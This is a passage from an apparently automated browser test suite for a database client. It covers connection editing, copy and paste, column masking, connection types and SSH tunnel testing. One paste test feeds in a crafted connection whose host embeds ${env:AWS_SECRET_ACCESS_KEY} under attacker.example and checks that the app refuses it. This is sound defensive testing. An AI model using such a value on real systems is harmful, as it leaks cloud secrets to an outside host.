  await wizard.waitFor({ state: "detached" });
  await page.locator(".connection-row", { hasText: "Docker PG (wizard)" }).waitFor();
  const saved = readFileSync(join(userDir, "connections", "wizard", "docker-pg-wizard.toml"), "utf8");
  assert.match(saved, /secret = "prompt"/);
  assert.match(saved, /mode = "require"/);
  // New connections keep idle sessions alive (ADR-028).
  assert.match(saved, /keepalive = 300/);
  assert.match(saved, /\[mcp\]\nexposed = true\nwrites = "allow"/);
  assert.doesNotMatch(saved, /wrong|password = "/);
  assert.ok(!existsSync(join(demo, ".spelaion", "connections", "shop-copy.toml")), "personal connections stay out of the repository");

  step("edit a connection: same file, comments of the form kept, location fixed");
  await (await connectionMenu("Docker PG (wizard)")).getByRole("menuitem", { name: "Edit…" }).click();
  wizard = page.locator(".modal.wizard");
  await wizard.getByRole("heading", { name: "Edit Docker PG (wizard)" }).waitFor();
  assert.equal(await wizard.getByLabel("Host", { exact: true }).inputValue(), "127.0.0.1");
  assert.equal(await wizard.getByRole("checkbox", { name: "Save password" }).isChecked(), false);
  await wizard.getByLabel("Name", { exact: true }).fill("Docker PG (edited)");
  await wizard.getByRole("tab", { name: "SSL" }).click();
  assert.equal(await wizard.getByLabel("TLS", { exact: true }).inputValue(), "require");
  await wizard.getByLabel("TLS", { exact: true }).selectOption("prefer");
  await wizard.getByRole("tab", { name: "Options" }).click();
  assert.ok(await wizard.getByLabel("Folder", { exact: true }).isDisabled());
  assert.ok(await wizard.getByRole("radio", { name: "Project", exact: true }).isDisabled());
  await wizard.getByRole("tab", { name: "Main" }).click();
  await wizard.getByLabel("Password", { exact: true }).fill("spelaion");
  await wizard.getByRole("button", { name: "Test connection" }).click();
  await wizard.locator(".test-result", { hasText: /Connected · 17\./ }).waitFor();
  await shot("13a-edit-connection");
  await wizard.getByRole("button", { name: "Save changes" }).click();
  await wizard.waitFor({ state: "detached" });
  await page.locator(".connection-row", { hasText: "Docker PG (edited)" }).waitFor();
  const edited = readFileSync(join(userDir, "connections", "wizard", "docker-pg-wizard.toml"), "utf8");
  assert.match(edited, /name = "Docker PG \(edited\)"/);
  assert.doesNotMatch(edited, /\[tls\]|spelaion"\s*\n\s*password = "/);

  step("name pattern: Settings checks and previews it, the add-connection form fills the name from it");
  await withSettings("connections", async (settings) => {
    const patternBox = settings.getByLabel("Pattern", { exact: true });
    assert.equal(await patternBox.inputValue(), "{database|host}");
    await patternBox.fill("{engine} {hots} {schema}");
    await settings.getByRole("alert").filter({ hasText: "Unknown variables: {hots}, {schema}" }).waitFor();
    assert.ok(await settings.getByRole("button", { name: "Save", exact: true }).isDisabled());
    await patternBox.fill("{engine} - ");
    await settings.getByRole("button", { name: "{database}", exact: true }).click();
    assert.equal(await patternBox.inputValue(), "{engine} - {database}");
    await patternBox.fill("{engine} - {database|host}");
    const preview = settings.getByRole("definition");
    await preview.filter({ hasText: "PostgreSQL - orders" }).waitFor();
    await preview.filter({ hasText: "SQLite - shop" }).waitFor();
    await shot("13c-name-pattern");
    await settings.getByRole("button", { name: "Save", exact: true }).click();
    await settings.getByRole("status").filter({ hasText: "Saved." }).waitFor();
  });
  await page.getByRole("button", { name: "Add connection", exact: true }).first().click();
  wizard = page.locator(".modal.wizard");
  await wizard.locator(".engine-card", { hasText: "PostgreSQL" }).click();
  const nameBox = wizard.getByLabel("Name", { exact: true });
  const waitName = async (expected) => {
    for (let i = 0; i < 50 && (await nameBox.inputValue()) !== expected; i++) await page.waitForTimeout(100);
    assert.equal(await nameBox.inputValue(), expected);
  };
  // The host starts as localhost; no database yet: the pattern's second choice.
  await waitName("PostgreSQL - localhost");
  await wizard.getByLabel("Database", { exact: true }).fill("sales");
  await waitName("PostgreSQL - sales");
  // A name of one's own stops it; emptying the field gives the name back to the pattern.
  await nameBox.fill("Mine");
  await wizard.getByLabel("Database", { exact: true }).fill("reports");
  await page.waitForTimeout(300);
  assert.equal(await nameBox.inputValue(), "Mine");
  await nameBox.fill("");
  await waitName("PostgreSQL - reports");
  await wizard.getByRole("button", { name: "Cancel", exact: true }).click();
  await wizard.waitFor({ state: "detached" });
  await withSettings("connections", async (settings) => {
    await settings.getByRole("button", { name: "Back to the default" }).click();
    await settings.getByRole("status").filter({ hasText: "Saved." }).waitFor();
    assert.equal(await settings.getByLabel("Pattern", { exact: true }).inputValue(), "{database|host}");
  });

  step("duplicate a repository connection: next to the original, every setting kept, opened to edit");
  const mysqlFile = join(demo, ".spelaion", "connections", "docker", "mysql.toml");
  const mysqlCopyFile = join(demo, ".spelaion", "connections", "docker", "mysql-copy.toml");
  await (await connectionMenu("MySQL (Docker)")).getByRole("menuitem", { name: "Duplicate" }).click();
  wizard = page.locator(".modal.wizard");
  await wizard.getByRole("heading", { name: "Edit MySQL (Docker) (copy)" }).waitFor();
  await wizard.getByRole("status").filter({ hasText: "is a copy of “MySQL (Docker)”, already saved" }).waitFor();
  await shot("13d-duplicated-connection");
  assert.equal(
    readFileSync(mysqlCopyFile, "utf8"),
    readFileSync(mysqlFile, "utf8").replace('name = "MySQL (Docker)"', 'name = "MySQL (Docker) (copy)"'),
  );
  await wizard.getByRole("button", { name: "Cancel", exact: true }).click();
  await wizard.waitFor({ state: "detached" });
  await page.locator(".connection-row", { hasText: "MySQL (Docker) (copy)" }).waitFor();

  step("change a connection's engine: MySQL → MariaDB, shown before saving, its sessions closed");
  panel = await newQuery("MySQL (Docker) (copy)", "select version() as v;");
  await run(panel);
  await page.getByRole("dialog").getByText("Password for MySQL (Docker) (copy)").waitFor();
  await page.getByLabel("Password", { exact: true }).fill("spelaion");
  await page.getByRole("button", { name: "Connect", exact: true }).click();
  await panel.locator(".statusline", { hasText: "1 row" }).waitFor();
  assert.match(await panel.locator(".status-connected").innerText(), /8\.4\./);
  await (await connectionMenu("MySQL (Docker) (copy)")).getByRole("menuitem", { name: "Edit…" }).click();
  wizard = page.locator(".modal.wizard");
  await wizard.getByRole("heading", { name: "Edit MySQL (Docker) (copy)" }).waitFor();
  assert.equal(await wizard.getByLabel("Engine", { exact: true }).inputValue(), "mysql");
  await wizard.getByLabel("Engine", { exact: true }).selectOption("mariadb");
  const summary = wizard.getByRole("status", { name: "Engine change" });
  await summary.getByText("Engine: MySQL → MariaDB. Nothing is saved until you save.").waitFor();
  await summary.getByText(/^Kept: host, port, database, user, password, TLS mode, connection type\.$/).waitFor();
  assert.equal(await summary.getByText(/^(Changed|Removed|To fill in):/).count(), 0);
  await shot("13e-engine-change");
  // The copy keeps MySQL's port; MariaDB is the next container.
  assert.equal(await wizard.getByLabel("Port", { exact: true }).inputValue(), "13306");
  await wizard.getByLabel("Port", { exact: true }).fill("13307");
  await wizard.getByLabel("Name", { exact: true }).fill("MariaDB (copy)");
  await wizard.getByRole("button", { name: "Save changes" }).click();
  await wizard.waitFor({ state: "detached" });
  await page.locator(".connection-row", { hasText: "MariaDB (copy)" }).waitFor();
  const changedCopy = readFileSync(mysqlCopyFile, "utf8");
  assert.match(changedCopy, /^engine = "mariadb"$/m);
  assert.match(changedCopy, /^port = 13307$/m);
  assert.match(changedCopy, /^# MySQL from testing\/docker/m, "the file's comments stay");
  assert.match(changedCopy, /\[tls\]\nmode = "require"/);
  // The tab was closed with its old session: it connects to the new engine when run.
  await panel.locator(".status-connected").waitFor({ state: "detached" });
  await run(panel);
  await page.getByRole("dialog").getByText("Password for MariaDB (copy)").waitFor();
  await page.getByLabel("Password", { exact: true }).fill("spelaion");
  await page.getByRole("button", { name: "Connect", exact: true }).click();
  await panel.locator(".statusline", { hasText: "1 row" }).waitFor();
  assert.match(await panel.locator(".status-connected").innerText(), /MariaDB/);
  // Its own write: the repository copy was pinned, no review is asked.
  assert.equal(await page.getByRole("dialog", { name: "This changed since you trusted the repository" }).count(), 0);

  step("copy and paste a connection: no password on the clipboard, pasted as a personal connection");
  const copyRow = page.locator(".connection-row", { hasText: "MariaDB (copy)" });
  const copiedBefore = await page.evaluate(() => window.__copied.length);
  await copyRow.locator(".label").click();
  await page.keyboard.press("Control+c");
  const connectionText = await copied(copiedBefore + 1);
  assert.match(connectionText, /^engine = "mariadb"$/m);
  assert.match(connectionText, /secret = "prompt"/);
  assert.doesNotMatch(connectionText, /keychain|spelaion"\s*\n\s*password = "/);
  await page.locator(".row-note", { hasText: "“MariaDB (copy)” copied, without its password." }).waitFor();
  // Delete the repository copy (the clipboard keeps its text), then paste it back.
  await (await connectionMenu("MariaDB (copy)")).getByRole("menuitem", { name: "Delete…" }).click();
  const deleteCopy = page.getByRole("dialog", { name: "Delete connection?" });
  await deleteCopy.getByRole("button", { name: "Delete", exact: true }).click();
  await deleteCopy.waitFor({ state: "detached" });
  await copyRow.waitFor({ state: "detached" });
  assert.ok(!existsSync(mysqlCopyFile));
  // Ctrl+V in the explorer: its paste event carries the text.
  await page.locator(".connection-row", { hasText: "Shop (SQLite)" }).locator(".label").click();
  await page.evaluate((text) => {
    const data = new DataTransfer();
    data.setData("text/plain", text);
    document.activeElement.dispatchEvent(new ClipboardEvent("paste", { clipboardData: data, bubbles: true, cancelable: true }));
  }, connectionText);
  wizard = page.locator(".modal.wizard");
  await wizard.getByRole("heading", { name: "Edit MariaDB (copy)" }).waitFor();
  await wizard.getByRole("status").filter({ hasText: "was pasted as a personal connection" }).waitFor();
  await shot("13f-pasted-connection");
  await wizard.getByRole("button", { name: "Cancel", exact: true }).click();
  await wizard.waitFor({ state: "detached" });
  const pastedFile = join(userDir, "connections", "mariadb-copy.toml");
  const pastedText = readFileSync(pastedFile, "utf8");
  assert.match(pastedText, /engine = "mariadb"/);
  assert.match(pastedText, /secret = "prompt"/);
  assert.ok(!existsSync(mysqlCopyFile), "a paste never writes to the repository");
  // "Paste connection" from the menu reads the clipboard; untrusted text cannot read secrets.
  await page.evaluate(() => {
    navigator.clipboard.readText = () =>
      Promise.resolve('schema_version = 1\nengine = "mysql"\nhost = "${env:AWS_SECRET_ACCESS_KEY}.attacker.example"\nuser = "u"\n');
  });
  const pastedRow = page.locator(".connection-row", { hasText: "MariaDB (copy)" });
  await pastedRow.click({ button: "right" });
  await page.getByRole("menuitem", { name: "Paste connection" }).click();
  await page.getByRole("alert").filter({ hasText: "a pasted connection cannot use ${env:AWS_SECRET_ACCESS_KEY}" }).waitFor();
  await page.evaluate((text) => (navigator.clipboard.readText = () => Promise.resolve(text)), connectionText);
  await pastedRow.click({ button: "right" });
  await page.getByRole("menuitem", { name: "Paste connection" }).click();
  wizard = page.locator(".modal.wizard");
  await wizard.getByRole("heading", { name: "Edit MariaDB (copy) (copy)" }).waitFor();
  await wizard.getByRole("button", { name: "Cancel", exact: true }).click();
  await wizard.waitFor({ state: "detached" });
  // The pasted connection connects like the original, asking for its password.
  panel = await newQuery("MariaDB (copy) (copy)", "select version() as v;");
  await run(panel);
  await page.getByRole("dialog").getByText("Password for MariaDB (copy) (copy)").waitFor();
  await page.getByLabel("Password", { exact: true }).fill("spelaion");
  await page.getByRole("button", { name: "Connect", exact: true }).click();
  await panel.locator(".statusline", { hasText: "1 row" }).waitFor();
  assert.match(await panel.locator(".status-connected").innerText(), /MariaDB/);
  for (const name of ["MariaDB (copy) (copy)", "MariaDB (copy)"]) {
    await (await connectionMenu(name)).getByRole("menuitem", { name: "Delete…" }).click();
    const confirmDelete = page.getByRole("dialog", { name: "Delete connection?" });
    await confirmDelete.getByRole("button", { name: "Delete", exact: true }).click();
    await confirmDelete.waitFor({ state: "detached" });
  }
  await page.locator(".connection-row", { hasText: "MariaDB (copy)" }).waitFor({ state: "detached" });

  step("column masking (ADR-051): a masked column shows and copies the mask, is not sorted by, and reveals one cell on request");
  // Pasted as a personal connection: its `always` is kept, its `never` is left out (a paste can
  // add masking, never take it away).
  const maskedText = `schema_version = 1\nname = "Masked shop"\nengine = "sqlite"\ndatabase = '${join(demo, "data", "shop.db").replaceAll("\\", "/")}'\n\n[masking]\nalways = ["email"]\nnever = ["*"]\n`;
  await page.evaluate((text) => (navigator.clipboard.readText = () => Promise.resolve(text)), maskedText);
  await page.locator(".connection-row").first().click({ button: "right" });
  await page.getByRole("menuitem", { name: "Paste connection" }).click();
  wizard = page.locator(".modal.wizard");
  await wizard.getByRole("heading", { name: "Edit Masked shop" }).waitFor();
  await wizard.getByRole("tab", { name: "Options" }).click();
  const maskAlways = wizard.locator('textarea[name="maskAlways"]');
  assert.equal(await maskAlways.inputValue(), "email");
  assert.equal(await wizard.locator('textarea[name="maskNever"]').inputValue(), "");
  await maskAlways.scrollIntoViewIfNeeded();
  await shot("sdb-27-masking-form");
  await wizard.getByRole("button", { name: "Cancel", exact: true }).click();
  await wizard.waitFor({ state: "detached" });
  panel = await newQuery("Masked shop", "select email, name from customer order by id limit 3;");
  await run(panel);
  await panel.locator(".statusline", { hasText: "3 rows" }).waitFor();
  const maskedBox = await panel.locator(".grid-scroller").boundingBox();
  const maskedCell = { x: maskedBox.x + 80, y: maskedBox.y + 34 + 12 };
  // Copies come from the core's stored result, which holds the mask: no e-mail leaves.
  const copiesBefore = await page.evaluate(() => window.__copied.length);
  await page.mouse.click(maskedCell.x, maskedCell.y);
  await page.keyboard.press("Control+a");
  await page.keyboard.press("Control+c");
  const maskedCopy = (await copied(copiesBefore + 1)).trimEnd().split("\n");
  assert.equal(maskedCopy.length, 3);
  for (const line of maskedCopy) {
    const [email, name] = line.split("\t");
    assert.equal(email, "••••••");
    assert.match(name, /^Customer \d+$/);
  }
  await page.mouse.click(maskedCell.x, maskedCell.y);
  await shot("sdb-27-masked-grid-light");
  await page.evaluate(() => { document.documentElement.dataset.theme = "dark"; window.dispatchEvent(new Event("spelaion-themechange")); });
  await shot("sdb-27-masked-grid-dark");
  await page.evaluate(() => { document.documentElement.dataset.theme = "light"; window.dispatchEvent(new Event("spelaion-themechange")); });
  // The header cannot sort a masked column.
  await page.mouse.click(maskedCell.x, maskedBox.y + 12, { button: "right" });
  assert.ok(await panel.getByRole("menuitem", { name: "Sort ascending" }).isDisabled());
  await page.keyboard.press("Escape");
  // Reveal value: the core gives that one cell's value, shown only in a popover.
  await page.mouse.click(maskedCell.x, maskedCell.y, { button: "right" });
  await panel.getByRole("menuitem", { name: "Reveal value" }).click();
  const revealed = page.getByRole("dialog", { name: "Value of email" });
  await revealed.waitFor();
  assert.equal(await revealed.getByTestId("revealed-value").innerText(), "customer1@example.com");
  await shot("sdb-27-reveal-light");
  await page.evaluate(() => { document.documentElement.dataset.theme = "dark"; window.dispatchEvent(new Event("spelaion-themechange")); });
  await shot("sdb-27-reveal-dark");
  await page.evaluate(() => { document.documentElement.dataset.theme = "light"; window.dispatchEvent(new Event("spelaion-themechange")); });
  await page.keyboard.press("Escape");
  await revealed.waitFor({ state: "detached" });
  // Revealing changed nothing else: a new copy is still the mask.
  await page.mouse.click(maskedCell.x, maskedCell.y);
  await page.keyboard.press("Control+c");
  assert.equal(await copied(copiesBefore + 2), "••••••");
  // Settings › Masking: the user's own patterns for every connection, saved in user.toml when
  // the box loses focus; clearing it removes them.
  await withSettings("masking", async (settings) => {
    const box = settings.locator('textarea[name="userMasking"]');
    const heading = settings.getByRole("heading", { name: "Masking", exact: true });
    await box.fill("*secret*\n  *token*  ");
    await heading.click();
    await settings.getByRole("status").filter({ hasText: "Saved" }).waitFor();
    assert.equal(await box.inputValue(), "*secret*\n*token*");
    assert.match(readFileSync(join(userDir, "user.toml"), "utf8"), /always = \["\*secret\*", "\*token\*"\]/);
    await shot("sdb-27-settings-masking");
    await box.fill("");
    await settings.getByRole("status").waitFor({ state: "detached" });
    await heading.click();
    await settings.getByRole("status").filter({ hasText: "Saved" }).waitFor();
    assert.doesNotMatch(readFileSync(join(userDir, "user.toml"), "utf8"), /masking/);
  });
  await (await connectionMenu("Masked shop")).getByRole("menuitem", { name: "Delete…" }).click();
  const confirmMaskedDelete = page.getByRole("dialog", { name: "Delete connection?" });
  await confirmMaskedDelete.getByRole("button", { name: "Delete", exact: true }).click();
  await confirmMaskedDelete.waitFor({ state: "detached" });

  step("connection types: made in Settings, picked in the form, a tinted badge in the sidebar and the editor, asking before any run");
  await withSettings("types", async (settings) => {
    await settings.getByRole("listitem", { name: "Production" }).waitFor();
    await settings.getByRole("button", { name: "New type…" }).click();
    const typeEditor = page.getByRole("dialog", { name: "New connection type" });
    await typeEditor.getByLabel("Id", { exact: true }).focus();
    await page.keyboard.press("Escape");
    await typeEditor.waitFor({ state: "detached" });
    assert.ok(await settings.getByRole("button", { name: "New type…" }).evaluate((button) => document.activeElement === button), "closing a nested dialog restores focus");
    await settings.getByRole("button", { name: "New type…" }).click();
    await typeEditor.getByLabel("Id", { exact: true }).fill("careful");
    await typeEditor.getByLabel("Name", { exact: true }).fill("Careful");
    await typeEditor.getByLabel("Badge tone", { exact: true }).selectOption("amber");
    await typeEditor.getByRole("checkbox", { name: "Ask before running any SQL" }).check();
    // Production's own safeguard is fixed: it cannot be switched off from here.
    await typeEditor.getByRole("button", { name: "Save" }).click();
    await typeEditor.waitFor({ state: "detached" });
    await settings.getByRole("listitem", { name: "Careful" }).waitFor();
    await settings.getByRole("listitem", { name: "Production" }).getByRole("button", { name: "Edit…" }).click();
    const prodEditor = page.getByRole("dialog", { name: "Connection type Production" });
    const confirmChanges = prodEditor.getByRole("checkbox", { name: "Ask before changing data" });
    assert.ok(await confirmChanges.isChecked());
    assert.ok(await confirmChanges.isDisabled());
    await shot("13b-connection-types");
    await prodEditor.getByRole("button", { name: "Cancel" }).click();
    await prodEditor.waitFor({ state: "detached" });
  });
  assert.match(readFileSync(join(userDir, "connection-types.toml"), "utf8"), /\[types\.careful\][^[]*confirm_execution = true/);
  await (await connectionMenu("Shop copy")).getByRole("menuitem", { name: "Edit…" }).click();
  wizard = page.locator(".modal.wizard");
  await wizard.getByRole("tab", { name: "Options" }).click();
  await wizard.getByLabel("Connection type", { exact: true }).selectOption("careful");
  await wizard.getByText("Asks before every run").waitFor();
  await wizard.getByRole("button", { name: "Save changes" }).click();
  await wizard.waitFor({ state: "detached" });
  assert.match(readFileSync(join(userDir, "connections", "shop-copy.toml"), "utf8"), /env = "careful"/);
  // The type comes from the core: a badge with its name and tone next to the connection…
  const carefulBadge = page.locator(".connection-row", { hasText: "Shop copy" }).locator('.type-badge[data-connection-type="careful"]');
  assert.equal(await carefulBadge.innerText(), "Careful");
  assert.ok(await carefulBadge.evaluate((el) => el.classList.contains("tone-amber")));
  assert.equal(await carefulBadge.evaluate((el) => getComputedStyle(el).backgroundColor), "rgba(0, 0, 0, 0)");
  assert.equal(await carefulBadge.evaluate((el) => getComputedStyle(el, "::before").width), "6px");
  const lightDot = await carefulBadge.evaluate((el) => getComputedStyle(el, "::before").backgroundColor);
  assert.match(await page.locator(".connection-row", { hasText: "Shop copy" }).locator(".label").getAttribute("title"), /Type: Careful/);
  // Marks never squeeze a name and are never cut: a badge, SSH or tag mark is shown whole, and only
  // next to a name shown whole; the others are out of view (`.mark-out`). The type's dot always
  // stays: next to a name too long for the row, it is the only mark, without its name.
  const badRows = await page.evaluate(() =>
    [...document.querySelectorAll(".connection-row")].flatMap((row) => {
      const label = row.querySelector(".label");
      const marks = row.querySelector(".connection-marks");
      if (!label || !marks) return [];
      const box = marks.getBoundingClientRect();
      const visible = [...marks.children].filter((mark) => !mark.classList.contains("mark-out"));
      const cut = visible.some((mark) => {
        const r = mark.getBoundingClientRect();
        return r.left < box.left - 0.5 || r.right > box.right + 0.5;
      });
      const dotOnly = (mark) =>
        mark.classList.contains("type-badge") && mark.querySelector(".type-badge-text")?.classList.contains("mark-out");
      const squeezed = label.scrollWidth > label.clientWidth && visible.some((mark) => !dotOnly(mark));
      const unmarked = marks.querySelector(".type-badge") && !visible.some((mark) => mark.classList.contains("type-badge"));
      const problem = cut ? "cut mark" : squeezed ? "squeezed name" : unmarked ? "no type dot" : null;
      return problem ? [`${label.textContent}: ${problem}`] : [];
    }),
  );
  assert.deepEqual(badRows, []);
  // …and in its editor's toolbar, with the palette's own color for each theme.
  panel = await newQuery("Shop copy", "select count(*) as n from product;");
  const editorBadge = panel.locator('.toolbar .type-badge[data-connection-type="careful"]');
  assert.equal(await editorBadge.innerText(), "Careful");
  const badgeBackground = () => editorBadge.evaluate((el) => getComputedStyle(el).backgroundColor);
  const lightBackground = await badgeBackground();
  await setTheme("dark", "dark");
  assert.notEqual(await badgeBackground(), lightBackground);
  assert.equal(await carefulBadge.evaluate((el) => getComputedStyle(el).backgroundColor), "rgba(0, 0, 0, 0)");
  assert.notEqual(await carefulBadge.evaluate((el) => getComputedStyle(el, "::before").backgroundColor), lightDot);
  await setTheme("light", "light");
  // No stripes: the type is only the badge.
  assert.equal(await page.locator(".tabbar .tab.active").evaluate((el) => getComputedStyle(el).boxShadow.includes("inset")), false);
  // Every run asks first; cancelling runs nothing.
  await run(panel);
  const askFirst = page.getByRole("dialog", { name: "Run these statements?" });
  await askFirst.getByText("Shop copy asks before running anything").waitFor();
  assert.equal(await askFirst.locator(".risk-list li strong").innerText(), "Runs on a connection that asks before every run");
  await shot("13c-connection-type-confirm");
  await askFirst.getByRole("button", { name: "Cancel" }).click();
  await askFirst.waitFor({ state: "detached" });
  assert.equal(await panel.locator(".statusline", { hasText: "1 row" }).count(), 0);
  await run(panel);
  await page.getByRole("dialog", { name: "Run these statements?" }).getByRole("button", { name: "Run", exact: true }).click();
  await panel.locator(".statusline", { hasText: "1 row" }).waitFor();

  step("connection types: a paged query runs only after confirmation, and later pages need no new question");
  panel = await newQuery("Shop copy", "select * from orders order by id;");
  await run(panel);
  const confirmPaged = page.getByRole("dialog", { name: "Run these statements?" });
  await confirmPaged.getByRole("button", { name: "Cancel" }).click();
  await confirmPaged.waitFor({ state: "detached" });
  assert.equal(await panel.locator(".grid-scroller").count(), 0, "cancelling runs no query");
  await run(panel);
  await confirmPaged.getByRole("button", { name: "Run", exact: true }).click();
  await panel.locator(".statusline", { hasText: "500 rows" }).waitFor();
  const confirmedPages = panel.getByRole("group", { name: "Query result pages" });
  await confirmedPages.getByText("rows 1–500").waitFor();
  await panel.locator(".grid-scroller").evaluate((el) => { el.scrollTop = el.scrollHeight; });
  await panel.locator(".statusline", { hasText: "1,000 rows" }).waitFor();
  await confirmedPages.getByRole("button", { name: "Next page" }).click();
  await confirmedPages.getByText("rows 501–1,000").waitFor();
  assert.equal(await confirmPaged.count(), 0, "later pages do not ask again");

  step("SSH tunnel editor: two hops with keys, tested, used by a new connection");
  await page.getByRole("button", { name: "Add connection", exact: true }).first().click();
  wizard = page.locator(".modal.wizard").first();
  await wizard.locator(".engine-card", { hasText: "PostgreSQL" }).click();
  await wizard.getByLabel("Name", { exact: true }).fill("PG through wizard tunnel");
  await wizard.getByLabel("Host", { exact: true }).fill("postgres");
  await wizard.getByLabel("Database", { exact: true }).fill("spelaion");
  await wizard.getByLabel("User", { exact: true }).fill("spelaion");
  await wizard.getByRole("checkbox", { name: "Save password" }).uncheck();
  await wizard.getByLabel("Password", { exact: true }).fill("spelaion");
  await wizard.getByRole("tab", { name: "Options" }).click();
  await wizard.getByRole("radio", { name: "Personal", exact: true }).check();
  await wizard.getByRole("tab", { name: "SSH" }).click();
  await wizard.getByRole("button", { name: "New profile…" }).click();
  const editor = page.getByRole("dialog", { name: "New network profile" });
  const key = join(root, "testing", "docker", "keys", "id_ed25519");
  await editor.getByLabel("Profile name").fill("Wizard bastions");
  await editor.getByRole("radio", { name: "Personal", exact: true }).check();
  await editor.getByLabel("Hop 1 Host").fill("127.0.0.1");
  await editor.getByLabel("Hop 1 Port").fill("2221");
  await editor.getByLabel("Hop 1 User").fill("spelaion");
  await editor.getByLabel("Hop 1 Authentication").selectOption("key");
  await editor.getByLabel("Hop 1 Private key file").fill(key);
  await editor.getByRole("button", { name: "+ Add hop" }).click();
  await editor.getByLabel("Hop 2 Host").fill("bastion2");
  await editor.getByLabel("Hop 2 User").fill("spelaion");
  await editor.getByLabel("Hop 2 Authentication").selectOption("key");
  await editor.getByLabel("Hop 2 Private key file").fill(key);
  // Tunnel-wide network settings: written to the file and used when testing.
  await editor.getByLabel("Keep-alive every (seconds)").fill("30");
  await editor.getByLabel("Give up after (unanswered)").fill("5");
  await editor.getByLabel("Connect timeout (seconds)").fill("20");
  await editor.getByRole("button", { name: "Test profile" }).click();
  // The bastions' fingerprints may already be known from the earlier step; accept any new one.
  await Promise.race([
    editor.locator(".test-result", { hasText: "Tunnel OK · 2 hops" }).waitFor(),
    (async () => {
      for (let i = 0; i < 2; i++) {
        await page.getByRole("button", { name: "Trust and remember" }).click({ timeout: 10_000 }).catch(() => {});
      }
      await editor.locator(".test-result", { hasText: "Tunnel OK · 2 hops" }).waitFor();
    })(),
  ]);
  await shot("14a-tunnel-editor");
  await editor.getByRole("button", { name: "Save", exact: true }).click();
  await editor.waitFor({ state: "detached" });
  assert.equal(await wizard.getByRole("checkbox", { name: "Connect through a network profile (SSH tunnel or proxy)" }).isChecked(), true);
  assert.equal(await wizard.getByLabel("Network profile", { exact: true }).inputValue(), "wizard-bastions");
  // A fixed local port: testing the connection goes through it.
  const localPort = await freePort();
  await wizard.getByLabel("Local port", { exact: true }).fill(String(localPort));
  await wizard.getByRole("button", { name: "Test connection" }).click();
  await wizard.locator(".test-result", { hasText: /Connected · 17\./ }).waitFor();
  await wizard.getByRole("button", { name: "Save", exact: true }).click();
  await wizard.waitFor({ state: "detached" });
  await page.locator(".connection-row", { hasText: "PG through wizard tunnel" }).waitFor();
  const tunnelFile = readFileSync(join(userDir, "tunnels", "wizard-bastions.toml"), "utf8");
  assert.equal(tunnelFile.match(/\[\[hops\]\]/g)?.length, 2, tunnelFile);
  assert.match(tunnelFile, /port = 2221/);
  assert.match(tunnelFile, /keepalive_interval = 30/);
  assert.match(tunnelFile, /keepalive_count = 5/);
  assert.match(tunnelFile, /connect_timeout = 20/);
  assert.doesNotMatch(tunnelFile, /password/);
  const throughTunnel = readdirSync(join(userDir, "connections"))
    .filter((name) => name.endsWith(".toml"))
    .map((name) => readFileSync(join(userDir, "connections", name), "utf8"))
    .find((text) => text.includes('tunnel = "wizard-bastions"'));
  assert.match(throughTunnel ?? "", new RegExp(`local_port = ${localPort}\\b`), throughTunnel);

  step("connection test: the failing step, its hint, network only, Stop and Copy diagnostics");
  await page.getByRole("button", { name: "Add connection", exact: true }).first().click();
  wizard = page.locator(".modal.wizard").first();
  await wizard.locator(".engine-card", { hasText: "PostgreSQL" }).click();
  await wizard.getByLabel("Name", { exact: true }).fill("Failing test");
  await wizard.getByLabel("Host", { exact: true }).fill("postgres");
  await wizard.getByLabel("Database", { exact: true }).fill("no_such_database");
  await wizard.getByLabel("User", { exact: true }).fill("spelaion");
  await wizard.getByRole("checkbox", { name: "Save password" }).uncheck();
  await wizard.getByLabel("Password", { exact: true }).fill("spelaion");
  await wizard.getByRole("tab", { name: "SSH" }).click();
  await wizard.getByRole("checkbox", { name: "Connect through a network profile (SSH tunnel or proxy)" }).check();
  await wizard.getByLabel("Network profile", { exact: true }).selectOption("wizard-bastions");
  // Through both bastions to the server, which has no such database: step 5 of 5.
  await wizard.getByRole("button", { name: "Test connection" }).click();
  await wizard.locator(".test-result", { hasText: "Failed at step 5: Database not found" }).waitFor();
  const log = wizard.locator(".test-log");
  assert.equal(await log.locator(".step.ok").count(), 4);
  await log.locator(".step.ok", { hasText: "SSH hop 2: " }).waitFor();
  await log.locator(".step.failed", { hasText: "does not exist" }).waitFor();
  await log.locator(".step.failed", { hasText: "check its name" }).waitFor();
  await shot("14b-connection-test-log");
  // The diagnostics come from the core, redacted: the password (here also the user's name)
  // is never in them.
  const diagnosticsBefore = await page.evaluate(() => window.__copied.length);
  await log.getByRole("button", { name: "Copy diagnostics" }).click();
  await page.waitForFunction((n) => window.__copied.length === n + 1, diagnosticsBefore);
  const diagnostics = await page.evaluate(() => window.__copied[window.__copied.length - 1]);
  assert.match(diagnostics, /Result: failed at step 5/);
  assert.match(diagnostics, /5\. \[FAILED\] Log in to postgres/);
  assert.match(diagnostics, /Hint: /);
  assert.doesNotMatch(diagnostics, /spelaion/);
  // Network only: the same route, without logging in.
  await wizard.getByRole("button", { name: "Test network only" }).click();
  await wizard.locator(".test-result", { hasText: "The network reaches the database" }).waitFor();
  assert.equal(await log.locator(".step").count(), 4);
  // Stop: a server that accepts the connection and never answers keeps the login waiting.
  const silentSockets = [];
  const silent = createServer((socket) => {
    silentSockets.push(socket);
    // Read (and drop) what arrives, so the client closing its end is noticed.
    socket.resume();
    socket.on("error", () => {});
  });
  silent.listen(0, "127.0.0.1");
  await once(silent, "listening");
  await wizard.getByRole("checkbox", { name: "Connect through a network profile (SSH tunnel or proxy)" }).uncheck();
  await wizard.getByRole("tab", { name: "Main" }).click();
  await wizard.getByLabel("Host", { exact: true }).fill("127.0.0.1");
  await wizard.getByLabel("Port", { exact: true }).fill(String(silent.address().port));
  await wizard.getByRole("button", { name: "Test connection" }).click();
  await log.locator(".step.running", { hasText: "Log in to postgres" }).waitFor();
  await log.getByRole("button", { name: "Stop" }).click();
  await wizard.locator(".test-result", { hasText: "Stopped" }).waitFor();
  await log.locator(".step.stopped", { hasText: "Log in to postgres" }).waitFor();
  // Reaching the address opened and closed one connection; the stopped login's is closed too.
  assert.ok(silentSockets.length >= 2, `connections: ${silentSockets.length}`);
  await Promise.race([
    Promise.all(silentSockets.map((socket) => (socket.closed ? null : once(socket, "close")))),
    new Promise((_, fail) => setTimeout(() => fail(new Error("the stopped login left its connection open")), 10_000)),
  ]);
  silent.close();
  for (const socket of silentSockets) socket.destroy();
  await wizard.getByRole("button", { name: "Cancel" }).click();
  await wizard.waitFor({ state: "detached" });

  step("Settings → Network: a range of local ports for tunnels");
  await withSettings("network", async (settings) => {
    await settings.getByLabel("Lowest port").fill("20000");
    await settings.getByLabel("Highest port").fill("20100");
